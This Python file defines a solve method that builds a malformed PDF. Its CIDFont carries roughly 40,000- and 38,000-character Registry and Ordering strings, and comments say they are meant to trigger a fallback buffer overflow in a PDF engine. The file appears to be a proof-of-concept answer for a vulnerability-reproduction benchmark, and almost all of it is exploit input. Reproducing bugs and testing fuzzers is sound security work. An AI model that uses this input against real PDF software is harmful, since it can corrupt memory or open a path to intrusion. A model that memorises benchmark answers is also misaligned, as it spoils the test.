import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create very long Registry and Ordering strings to trigger the fallback buffer overflow
        # Keep total size around ~80KB to remain close to the ground-truth, but content is what matters.
        reg_len = 40000
        ord_len = 38000  # slightly less to keep total size near 80KB

        registry = "A" * reg_len
        ordering = "B" * ord_len

        # Build PDF objects
        def make_obj(obj_num: int, content: bytes) -> bytes:
            return f"{obj_num} 0 obj\n".encode() + content + b"\nendobj\n"

        # Header
        header = b"%PDF-1.7\n%\xE2\xE3\xCF\xD3\n"

        # 1: Catalog
        obj1 = make_obj(1, b"<< /Type /Catalog /Pages 2 0 R >>")

        # 2: Pages
        obj2 = make_obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")

        # 3: Page with resource referencing font F1 and contents
        page_dict = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] " \
                    b"/Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>"
        obj3 = make_obj(3, page_dict)

        # 4: Type0 font referencing CIDFont as descendant
        obj4 = make_obj(4, b"<< /Type /Font /Subtype /Type0 /BaseFont /ABCDEE+MyCIDFont "
                           b"/Encoding /Identity-H /DescendantFonts [6 0 R] >>")

        # 5: Content stream that selects F1 so the engine tries to load the font and triggers fallback
        stream_data = b"BT /F1 12 Tf 72 720 Td (Hello) Tj ET"
        obj5_content = b"<< /Length " + str(len(stream_data)).encode() + b" >>\nstream\n" + stream_data + b"\nendstream"
        obj5 = make_obj(5, obj5_content)

        # 6: CIDFont with oversized CIDSystemInfo Registry/Ordering strings
        # According to PDF spec, Registry and Ordering in CIDSystemInfo are strings (in parentheses)
        cid_system_info = f"<< /Registry ({registry}) /Ordering ({ordering}) /Supplement 0 >>".encode()
        obj6 = make_obj(6, b"<< /Type /Font /Subtype /CIDFontType0 /BaseFont /MyCIDFont /CIDSystemInfo " + cid_system_info + b" >>")

        # Assemble all objects and compute xref offsets
        objects = [obj1, obj2, obj3, obj4, obj5, obj6]
        offsets = []
        current_offset = len(header)
        for obj in objects:
            offsets.append(current_offset)
            current_offset += len(obj)

        # Build xref
        xref_start = current_offset
        xref_entries = [b"0000000000 65535 f \n"]
        for off in offsets:
            xref_entries.append(f"{off:010d} 00000 n \n".encode())
        xref = b"xref\n0 7\n" + b"".join(xref_entries)

        # Trailer
        trailer = b"trailer\n<< /Size 7 /Root 1 0 R >>\n"
        startxref = b"startxref\n" + str(xref_start).encode() + b"\n%%EOF\n"

        pdf = header + b"".join(objects) + xref + trailer + startxref
        return pdf